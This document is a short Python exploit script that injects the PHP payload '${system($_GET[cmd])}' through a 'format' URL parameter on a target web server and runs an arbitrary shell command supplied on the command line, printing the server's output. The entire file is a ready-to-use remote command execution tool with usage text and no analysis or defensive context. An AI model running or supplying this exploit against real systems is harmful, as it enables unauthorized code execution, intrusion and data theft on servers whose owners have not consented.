#!/usr/bin/env python3

import requests
import sys

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <target> <command>")
    sys.exit()

target = sys.argv[1]
command = sys.argv[2]

payload = "${system($_GET[cmd])}"
url = f"http://{target}/?format={payload}&cmd={command}"

resp = requests.get(url, verify=False)

response_parts = resp.text.split('<html>', 1)

if len(response_parts) > 1:
    response = response_parts[0]
else:
    response = resp.text

print(response)